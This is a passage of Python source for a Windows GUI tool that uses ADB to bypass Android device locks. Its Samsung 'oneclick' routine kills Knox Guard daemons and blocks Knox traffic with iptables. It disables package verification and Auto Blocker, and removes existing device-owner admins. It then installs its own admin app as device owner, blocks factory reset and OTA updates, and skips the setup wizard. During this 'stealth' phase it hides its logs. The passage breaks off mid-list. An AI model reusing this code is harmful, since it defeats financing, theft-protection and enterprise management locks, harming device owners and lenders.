            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: return
            threading.Thread(target=lambda: self._pkg_fetch_and_show(adb, devs[0]), daemon=True).start()

    def _pkg_fetch_and_show(self, adb, serial):
        try:
            r = subprocess.run([adb, '-s', serial, 'shell', 'pm list packages -f 2>/dev/null'],
                               capture_output=True, text=True, timeout=15)
            all_pkgs = {}
            for l in (r.stdout or '').split('\n'):
                if not l.startswith('package:'): continue
                rest = l[len('package:'):].strip()
                if '=' not in rest: continue
                path, pkg = rest.rsplit('=', 1)
                all_pkgs[pkg] = path
            r2 = subprocess.run([adb, '-s', serial, 'shell', 'pm list packages -d 2>/dev/null'],
                                capture_output=True, text=True, timeout=10)
            disabled = set()
            for l in (r2.stdout or '').split('\n'):
                if l.startswith('package:'):
                    disabled.add(l.split(':', 1)[1].strip())
            self.root.after(0, lambda: self._build_freeze_ui(adb, serial, all_pkgs, disabled))
        except Exception:
            pass

    def _build_freeze_ui(self, adb, serial, all_pkgs, disabled):
        try:
            pkgs = sorted(all_pkgs.keys())
            win = tk.Toplevel(self.root)
            win.title('Package Freezer')
            win.configure(bg=self.c['bg'])
            win.geometry('700x500')
            win.minsize(500, 300)
            hdr = tk.Frame(win, bg=self.c['surface'])
            hdr.pack(fill=tk.X, padx=6, pady=6)
            tk.Label(hdr, text='  Package Freezer', font=('Segoe UI', 12, 'bold'),
                     fg=self.c['accent2'], bg=self.c['surface']).pack(side=tk.LEFT, padx=6)
            total = len(pkgs)
            d_cnt = len(disabled)
            st = tk.Label(hdr, text=f'{total} packages  |  {d_cnt} frozen  |  {total-d_cnt} active',
                          font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['surface'])
            st.pack(side=tk.RIGHT, padx=6)
            search_f = tk.Frame(win, bg=self.c['bg'])
            search_f.pack(fill=tk.X, padx=6, pady=(0, 4))
            tk.Label(search_f, text='Search:', fg=self.c['muted'], bg=self.c['bg'],
                     font=('Segoe UI', 9)).pack(side=tk.LEFT, padx=2)
            sv = tk.StringVar()
            e = tk.Entry(search_f, textvariable=sv, bg=self.c['surface'], fg=self.c['fg'],
                         font=('Segoe UI', 9), relief='flat', bd=4, insertbackground=self.c['fg'])
            e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
            e.focus_set()
            lf = tk.Frame(win, bg=self.c['bg'])
            lf.pack(fill=tk.BOTH, expand=True, padx=6, pady=(0, 6))
            lb = tk.Listbox(lf, bg=self.c['surface'], fg=self.c['fg'],
                            font=('Consolas', 9), relief='flat', bd=0,
                            selectbackground=self.c['accent'], selectforeground=self.c['white'],
                            activestyle='none', highlightthickness=0)
            scroll = tk.Scrollbar(lf, orient=tk.VERTICAL, command=lb.yview,
                                  bg=self.c['surface'], troughcolor=self.c['bg'])
            lb.config(yscrollcommand=scroll.set)
            scroll.pack(side=tk.RIGHT, fill=tk.Y)
            lb.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
            def _fmt(pkg):
                icon = '*' if pkg in disabled else ' '
                return f'{icon} {pkg}'
            def _refresh():
                lb.delete(0, tk.END)
                q = sv.get().strip().lower()
                for p in pkgs:
                    if q and q not in p.lower(): continue
                    lb.insert(tk.END, _fmt(p))
                    if p in disabled:
                        lb.itemconfig(tk.END, fg=self.c['blue'])
            def _filter(*_): _refresh()
            sv.trace_add('write', _filter)
            def _toggle():
                sel = lb.curselection()
                if not sel: return
                text = lb.get(sel[0])
                pkg = text[2:].strip()
                if pkg in disabled:
                    subprocess.run([adb, '-s', serial, 'shell', f'pm enable {pkg} 2>/dev/null'],
                                   timeout=10, capture_output=True)
                    disabled.discard(pkg)
                else:
                    subprocess.run([adb, '-s', serial, 'shell',
                                    f'pm disable-user --user 0 {pkg} 2>/dev/null; pm disable {pkg} 2>/dev/null'],
                                   timeout=10, capture_output=True)
                    disabled.add(pkg)
                _refresh()
                st.config(text=f'{total} packages  |  {len(disabled)} frozen  |  {total-len(disabled)} active')
            btn_f = tk.Frame(win, bg=self.c['bg'])
            btn_f.pack(fill=tk.X, padx=6, pady=(0, 6))
            tk.Button(btn_f, text='Toggle Freeze', command=_toggle,
                      bg=self.c['accent'], fg=self.c['white'], font=('Segoe UI', 9, 'bold'),
                      relief='flat', padx=12, pady=4, cursor='hand2',
                      activebackground=self.c['accent2'], activeforeground=self.c['white']).pack(side=tk.LEFT, padx=2)
            def _do_refresh():
                r3 = subprocess.run([adb, '-s', serial, 'shell', 'pm list packages -d 2>/dev/null'],
                                    capture_output=True, text=True, timeout=10)
                new_disabled = set()
                for l in (r3.stdout or '').split('\n'):
                    if l.startswith('package:'):
                        new_disabled.add(l.split(':', 1)[1].strip())
                self.root.after(0, lambda nd=new_disabled: (
                    disabled.clear(), disabled.update(nd),
                    _refresh(),
                    st.config(text=f'{total} packages  |  {len(disabled)} frozen  |  {total-len(disabled)} active')))
            tk.Button(btn_f, text='Refresh', command=lambda: threading.Thread(target=_do_refresh, daemon=True).start(),
                      bg=self.c['surface'], fg=self.c['fg'], font=('Segoe UI', 9),
                      relief='flat', padx=12, pady=4, cursor='hand2').pack(side=tk.LEFT, padx=2)
            e.bind('<Return>', lambda _: _refresh())
            win.bind('<Escape>', lambda _: win.destroy())
            _refresh()
        except Exception:
            pass

    def _run_bypass(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Purge', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui('SPD BYPASS NEW METHOD', 8, steps)
            self.root.after(0, lambda: self._show_progress('SPD BYPASS NEW METHOD'))
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core('SPD', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'],
                disable_pkgs=True, quiet=False, uninstall_pkgs=['com.android.vending'])
            self.root.after(0, lambda: self._finish_progress(True, 'SPD BYPASS NEW METHOD COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — SPD Bypass New Method complete'))
        except Exception as _e:
            self.log(f'SPD bypass error: {_e}', 'e')
            import traceback as _tb
            self.log(_tb.format_exc(), 'e')

    def _install_aurora_store(self, adb, s, quiet=False):
        """Explicitly install Aurora Store APK from tools directory."""
        tools = self._tools_dir()
        flags = 0x08000000
        
        # First, ensure "Install unknown apps" permission for shell/adb
        subprocess.run([adb, '-s', s, 'shell', 'appops set com.android.shell REQUEST_INSTALL_PACKAGES allow 2>/dev/null'],
                       capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'appops set com.android.shell INSTALL_PACKAGES allow 2>/dev/null'],
                       capture_output=True, creationflags=flags)
        
        for _aux in ['aurora-clean.apk', 'aurora-store.apk', 'AuroraStore.apk', 'Aurora.apk', 'aurora_store.apk']:
            _aux_path = os.path.join(tools, _aux)
            if not os.path.isfile(_aux_path):
                continue
            
            self._ensure_apk_signed(_aux_path)
            _done = False
            
            # Try adb install first (most reliable)
            for _aa in [
                [adb, '-s', s, 'install', '-r', '-d', '-g', _aux_path],
                [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', '-g', _aux_path],
                [adb, '-s', s, 'install', '-r', '-d', '-t', '--install-reason=0', '-g', _aux_path],
                None,
            ]:
                if _aa is None:
                    # Fallback: push to device and use pm install
                    push_r = subprocess.run([adb, '-s', s, 'push', _aux_path, '/data/local/tmp/'], timeout=20, capture_output=True, creationflags=flags)
                    if push_r.returncode != 0:
                        continue
                    
                    for _pmc in [
                        f'pm install -r -t -g /data/local/tmp/{_aux}',
                        f'pm install -r -t -g --install-reason=0 /data/local/tmp/{_aux}',
                        f'cat /data/local/tmp/{_aux} | pm install -r -g -S {os.path.getsize(_aux_path)}',
                    ]:
                        _r = subprocess.run([adb, '-s', s, 'shell', _pmc], timeout=90, capture_output=True, text=True, creationflags=flags)
                        _out = (_r.stdout or '') + (_r.stderr or '')
                        if _r.returncode == 0 and 'Success' in _out and 'Failure' not in _out:
                            _done = True
                            break
                    if _done:
                        break
                else:
                    _r = subprocess.run(_aa, timeout=60, capture_output=True, text=True, creationflags=flags)
                    _out = (_r.stdout or '') + (_r.stderr or '')
                    if _r.returncode == 0 and 'Success' in _out and 'Failure' not in _out:
                        _done = True
                        break
            
            if _done:
                # Verify: check package is installed AND enabled
                r = subprocess.run([adb, '-s', s, 'shell', 'pm list packages -e com.aurora.store'], capture_output=True, text=True, timeout=5, creationflags=flags)
                if 'com.aurora.store' in (r.stdout or ''):
                    return True
                else:
                    self.log('Aurora Store verification failed - not enabled', 'w')
            else:
                self.log(f'Failed to install {_aux}', 'w')
        
        self.log('No Aurora Store APK found in tools/', 'w')
        return False

    def _run_mtk_bypass(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Purge', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui('MTK BYPASS NEW METHOD', 8, steps)
            self.root.after(0, lambda: self._show_progress('MTK BYPASS NEW METHOD'))
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core('MTK', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['mtk'], quiet=False, uninstall_pkgs=['com.android.vending'])
            self.root.after(0, lambda: self._finish_progress(True, 'MTK BYPASS NEW METHOD COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — MTK Bypass New Method complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'MTK bypass error: {_e}', 'e')
            import traceback as _tb
            self.log(_tb.format_exc(), 'e')

    
    def _run_mtk_bypass_2024(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Purge', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui('MTK BYPASS 2024', 8, steps)
            self.root.after(0, lambda: self._show_progress('MTK BYPASS 2024'))
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core('MTK 2024', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['mtk'], quiet=False, uninstall_pkgs=['com.android.vending'])
            self.root.after(0, lambda: self._finish_progress(True, 'MTK BYPASS 2024 COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — MTK Bypass 2024 complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'MTK 2024 bypass error: {_e}', 'e')
            import traceback as _tb
            self.log(_tb.format_exc(), 'e')

    
    def _samsung_full_bypass(self):
        if not self._ensure_active(): return
        flags = 0x08000000
        adb = self._find_adb()
        if not adb: self.log('ADB not found', 'e'); return
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials: self.log('No device found', 'e'); return
        if len(serials) > 1:
            self.log(f'Multiple devices: {", ".join(serials)} — using first', 'w')
        s = serials[0]

        # Keep phone awake + prevent lock during bypass
        subprocess.run([adb, '-s', s, 'shell',
            'svc power stayon true 2>/dev/null; '
            'settings put global stay_on_while_plugged_in 3 2>/dev/null; '
            'settings put system screen_off_timeout 1800000 2>/dev/null; '
            'settings put secure lockscreen.disabled 1 2>/dev/null; '
            'wm dismiss-keyguard 2>/dev/null'],
            timeout=5, capture_output=True, creationflags=flags)

        # ── Phase 1: Read device info ──
        raw = ''
        for _attempt in range(3):
            try:
                raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=30, creationflags=flags).stdout
                if raw.strip():
                    break
            except Exception:
                pass
            if _attempt < 2:
                subprocess.run([adb, 'kill-server'], timeout=5, capture_output=True)
                subprocess.run([adb, 'start-server'], timeout=10, capture_output=True)
                time.sleep(2)
        if not raw.strip():
            self.log('Device not responding — check USB connection', 'e'); return
        p = {}
        for line in raw.split('\n'):
            if ']: [' in line:
                k, v = line.strip()[1:].split(']: [', 1)
                p[k] = v.rstrip(']')
        def g(*keys):
            for k in keys:
                v = p.get(k, '')
                if v: return v
                try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                except Exception: pass
                if v: p[k] = v; return v
            return ''
        def gl(*keys):
            for k in sorted(p.keys()):
                if any(x in k.lower() for x in keys) and p[k]: return p[k]
            return ''
        def gv(*patterns):
            for k, v in sorted(p.items()):
                if v and any(x in v.lower() for x in patterns): return v
            return ''
        def gx(cmd):
            try: return subprocess.run([adb, '-s', s, 'shell', cmd], capture_output=True, text=True, timeout=5, creationflags=flags).stdout.strip()
            except Exception: return ''
        # ── Display device info ──
        self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
        self.log('Device:', 'h')
        self.log(f'Model:                {g("ro.product.model")}', 's')
        self.log(f'Device:               {g("ro.product.device")}', 'i')
        self.log(f'Platform:             {g("ro.board.platform", "ro.chipname")}', 'i')
        self.log(f'Android:              {g("ro.build.version.release")}', 'i')
        self.log(f'Security:             {g("ro.build.version.security_patch")}', 'i')
        self.log(f'CSC:                  {g("ro.csc.sales_code")}', 'i')
        self.log(f'Serial:               {g("ro.serialno", "sys.serialnumber")}', 'i')
        bl_val = g("ro.boot.bootloader")
        if bl_val: self.log(f'Bootloader:           {bl_val}', 'i')
        imei1 = g("ro.ril.miui.imei", "persist.radio.imei", "ro.telephony.imei", "gsm.imei", "ril.IMEI1", "ril.IMEI", "vendor.ril.imei", "ro.ril.oem.imei1", "ro.ril.oem.imei")
        def _valid_imei(s): return s and s.isdigit() and len(s) == 15 and s[:2] in ('35', '01', '86', '00')
        if _valid_imei(imei1): self.log(f'IMEI1:                {imei1}', 'i')
        imei2 = g("ro.ril.miui.imei2", "persist.radio.imei2", "ro.telephony.imei2", "gsm.imei2", "ril.IMEI2", "vendor.ril.imei2", "ro.ril.oem.imei2")
        if _valid_imei(imei2): self.log(f'IMEI2:                {imei2}', 'i')
        kg_raw = g("ro.boot.kgstatus") or g("gsm.KG") or g("persist.sys.kg") or g("ril.kgstatus") or g("ro.boot.kg") or ''
        kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
                  '0x4':'locked', '0x5':'allzero', '0x6':'broken', '0x7':'checking'}
        kg_display = kg_map.get(kg_raw.lower(), kg_raw) if kg_raw else 'unknown'
        self.log(f'KG State:             {kg_display}', 'w' if kg_display in ('broken','locked') else 'i')
        self.log_blank()
        self._enqueue_ui(lambda: self.root.update())

        # ── Show banner and suppress all intermediate logs ──
        def _show_banner():
            self.log_text.insert(tk.END, 'SAMSUNG ONECLICK IS BYPASS!\n', 'h')
            self.log_text.insert(tk.END, 'Please Wait!\n', 'i')
            self.log_text.see(tk.END)
        self.root.after(0, _show_banner)
        time.sleep(0.2)
        _saved_log_real = self._log_impl
        _saved_log_fmt_real = self._log_formatted_impl
        def _silent(msg, tag=None): pass
        def _silent_fmt(parts): pass
        self._log_impl = _silent
        self._log_formatted_impl = _silent_fmt

        # KG state reading
        kg_map = {'0x0':'prenormal', '0x1':'checking', '0x2':'completed', '0x3':'normal',
                  '0x4':'locked', '0x5':'allzero', '0x6':'broken', '0x7':'checking'}
        kg_props = [
            ('ro.boot.kgstatus', g('ro.boot.kgstatus')),
            ('persist.sys.kg.state', g('persist.sys.kg.state')),
            ('gsm.KG', g('gsm.KG')),
            ('ril.kgstatus', g('ril.kgstatus')),
            ('ro.boot.kg', g('ro.boot.kg')),
            ('persist.sys.kg', g('persist.sys.kg')),
        ]
        current_kg = ''
        _kg_dbg = []
        for k, v in kg_props:
            if v:
                _kg_dbg.append(f'{k}={v}')
                lv = v.lower()
                if lv in ('prenormal', 'checking', 'completed', 'normal', 'locked', 'allzero', 'broken'):
                    current_kg = lv
                elif lv in kg_map:
                    _kg_dbg.append(f'decoded {lv} -> {kg_map[lv]}')
                    current_kg = kg_map[lv]
        try:
            kg_settings = subprocess.run([adb, '-s', s, 'shell', 'settings get global knox_guard_status 2>/dev/null || settings get secure knox_guard_status 2>/dev/null || echo ""'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
            if kg_settings: _kg_dbg.append(f'settings={kg_settings}')
        except Exception: pass
        try:
            kg_proc = subprocess.run([adb, '-s', s, 'shell', 'ps -A 2>/dev/null | grep -iE "knox|kgclient|kgagent" || ps 2>/dev/null | grep -iE "knox|kgclient|kgagent"'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
            if kg_proc: _kg_dbg.append(f'procs={len(kg_proc.strip().split(chr(10)))}')
        except Exception: pass
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'kg_debug.log'), 'a') as _f:
                _f.write(f'[{datetime.datetime.now().isoformat()}] KG={current_kg or "unknown"} | {" ".join(_kg_dbg)}\n')
        except: pass

        # ── Phase 2: Stealth bypass ──
        self._log_buffer = []
        self._saved_log_impl = self._log_impl
        self._saved_log_formatted_impl = self._log_formatted_impl
        def _buf(msg, tag=None): self._log_buffer.append((msg, tag))
        def _buf_fmt(parts): self._log_buffer.append((''.join(t for t,_ in parts), None))
        self._log_impl = _buf
        self._log_formatted_impl = _buf_fmt
        self._magic_text = ''
        self._enqueue_ui(lambda: self.log_text.insert(tk.END, self._magic_text))
        self._enqueue_ui(lambda: self.log_text.see(tk.END))
        self._enqueue_ui(lambda: self.root.update())
        self._magic_anim_running = True
        self._magic_dots = 0
        def _anim_loop():
            while self._magic_anim_running:
                self._magic_dots = (self._magic_dots + 1) % 4
                dots = '.' * self._magic_dots
                self._enqueue_ui(lambda d=dots: (
                    self.log_text.delete('end-1l linestart', 'end-1l lineend'),
                    self.log_text.insert('end-1l linestart', f'{self._magic_text}{d}')))
                time.sleep(0.5)
        t = threading.Thread(target=_anim_loop, daemon=True)
        t.start()
        try:
            tools = self._tools_dir()
            apk = None
            for _n in ['mdm_king_admin_signed.apk', 'mdm_king_admin.apk']:
                _p = os.path.join(tools, _n)
                if os.path.isfile(_p): apk = _p; break
            if not apk: self.log('APK not found', 'e'); return
            self._ensure_apk_signed(apk)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global auto_blocker_enabled 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure auto_blocker_enabled 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global auto_blocker_enabled_v2 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure samsung_auto_blocker 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global samsung_auto_blocker 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'device_config put security auto_blocker_enabled false 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global package_verifier_enable 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global verifier_verify_adb_installs 0 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            def _install_apk():
                for i, args in enumerate([
                    [adb, '-s', s, 'install', '-r', '-d', apk],
                    [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', apk],
                    [adb, '-s', s, 'install', '-r', '-d', '--no-incremental', apk],
                    None,
                ]):
                    if args is None:
                        try:
                            subprocess.run([adb, '-s', s, 'push', apk, '/data/local/tmp/mdm_admin.apk'], timeout=15, capture_output=True, creationflags=flags)
                            r = subprocess.run([adb, '-s', s, 'shell', 'pm install -r /data/local/tmp/mdm_admin.apk 2>/dev/null'], timeout=30, capture_output=True, text=True, creationflags=flags)
                            if 'Success' in (r.stdout or '') or 'Success' in (r.stderr or ''):
                                return True
                        except Exception: pass
                        return False
                    r = subprocess.run(args, timeout=30, capture_output=True, text=True, creationflags=flags)
                    stdout = r.stdout or ''; stderr = r.stderr or ''
                    if 'Success' in stdout:
                        return True
                    err_msg = (stderr + stdout)[:200].replace('\n', ' ').strip()
                    if err_msg:
                        self.log(f'install #{i+1}: {err_msg}', 'w')
                return False
            apk_ok = _install_apk()
            r2 = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.mdmking.admin'], capture_output=True, text=True, timeout=5, creationflags=flags)
            if 'com.mdmking.admin' in (r2.stdout or ''):
                apk_ok = True
                self.log('Admin app confirmed on device', 's')
            else:
                self.log_warn('Admin app NOT installed - bypass may fail')
            # Kill KG daemons + block Samsung Knox traffic BEFORE activating admin
            subprocess.run([adb, '-s', s, 'shell',
                'killall -9 kgclient policydm kgagent klmsagent knoxguard 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "knox" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "samsungdm" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "kgclient" --algo bm -j DROP 2>/dev/null; '
                'iptables -A OUTPUT -m string --string "knoxguard" --algo bm -j DROP 2>/dev/null'],
                timeout=10, capture_output=True, creationflags=flags)
            _adb_block_dns(adb, s, lock=True, disable_acts=False, flags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'dpm remove-active-admin com.mdmking.admin/.MyAdminReceiver 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            # Remove existing device-owner first (Samsung KG or enterprise MDM)
            for existing_do in ['com.samsung.android.kgclient/.MyDeviceAdminReceiver',
                                'com.sec.enterprise.knox.cloudmdm.smdms/.DeviceAdminReceiver',
                                'com.samsung.android.knox.cloudmdm.smdms/.DeviceAdminReceiver']:
                subprocess.run([adb, '-s', s, 'shell', f'dpm remove-active-admin {existing_do} 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            r = subprocess.run([adb, '-s', s, 'shell', 'dpm set-device-owner com.mdmking.admin/.MyAdminReceiver'], timeout=10, capture_output=True, text=True, creationflags=flags)
            do_out = (r.stdout or '') + (r.stderr or '')
            if 'Success' in do_out or 'already' in do_out.lower():
                self.log('Device owner set', 's')
            else:
                r2 = subprocess.run([adb, '-s', s, 'shell', 'dpm set-profile-owner com.mdmking.admin/.MyAdminReceiver'], timeout=10, capture_output=True, text=True, creationflags=flags)
                po_out = (r2.stdout or '') + (r2.stderr or '')
                if 'Success' in po_out or 'already' in po_out.lower():
                    self.log('Admin activated as profile owner', 's')
                else:
                    err = po_out.strip().split('\n')[0][:80] if po_out else 'failed'
                    self.log(f'Admin activate: {err}', 'o')
            subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top'], timeout=5, capture_output=True, creationflags=flags)
            time.sleep(3)
            subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global ota_disable_automatic_update 1'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure ota_disable_automatic_update 1'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.samsung.android.fotaclient com.samsung.android.fota com.wssyncmldm com.sec.android.soagent 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global device_provisioned 1'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure user_setup_complete 1'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put secure skip_first_use_hint 1'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.google.android.setupwizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.android.setupwizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.sec.android.app.SecSetupWizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            time.sleep(3)
            r = subprocess.run([adb, '-s', s, 'shell', 'settings get secure enabled_accessibility_services'], capture_output=True, text=True, timeout=5, creationflags=flags)
            if 'MyAccessibilityService' in r.stdout: self.log_ok('HyperCore protection active - device secured')
            else: self.log_warn('Protection layer incomplete - manual check advised')
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 1 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            self._magic_text = ''
        finally:
            self._magic_anim_running = False
            self._log_impl = self._saved_log_impl
            self._log_formatted_impl = self._saved_log_formatted_impl
            buf = list(self._log_buffer)
            self._log_buffer.clear()
            self._enqueue_ui(lambda b=buf: (
                [self.log_text.insert(tk.END, f'[{t}] {m}\n' if t else m + '\n') for m, t in b],
                self.log_text.see(tk.END),
                self.root.update(),
                self.log_text.insert(tk.END, '\n')))
            # Disable all known lock packages for Samsung + common
            for pkg in CHIPSET_PACKAGES['samsung'] + CHIPSET_PACKAGES['common']:
                subprocess.run([adb, '-s', s, 'shell', f'pm disable-user --user 0 {pkg} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # KG state manipulation
            self.log('[*] Manipulating KG state...', 'i')
            # Kill all KG-related daemons (incl. 2026 v2 daemons)
            for cmd in ['setprop ctl.stop knoxguard', 'setprop ctl.stop kgclient',
                         'setprop ctl.stop kgagent', 'setprop ctl.stop klmsagent',
                         'setprop ctl.stop knoxguard2', 'setprop ctl.stop kgclient_v2',
                         'setprop ctl.stop kgagent2', 'setprop ctl.stop klmsagent2',
                         'stop knoxguard 2>/dev/null', 'stop knoxguard2 2>/dev/null',
                         'killall -9 knoxguard 2>/dev/null', 'killall -9 kgclient 2>/dev/null',
                         'killall -9 kgagent 2>/dev/null', 'killall -9 knox.attestation 2>/dev/null',
                         'killall -9 klmsagent 2>/dev/null', 'killall -9 knoxguard2 2>/dev/null',
                         'killall -9 kgclient_v2 2>/dev/null', 'killall -9 kgagent2 2>/dev/null',
                         'killall -9 klmsagent2 2>/dev/null', 'killall -9 knoxattestation2 2>/dev/null',
                         'killall -9 kgdaemon 2>/dev/null', 'killall -9 kgdaemon2 2>/dev/null',
                         'killall -9 samsungknoxagent2 2>/dev/null', 'killall -9 knoxanalyticsagent2 2>/dev/null',
                         'killall -9 knoxprocess2 2>/dev/null', 'killall -9 knox_tad2 2>/dev/null',
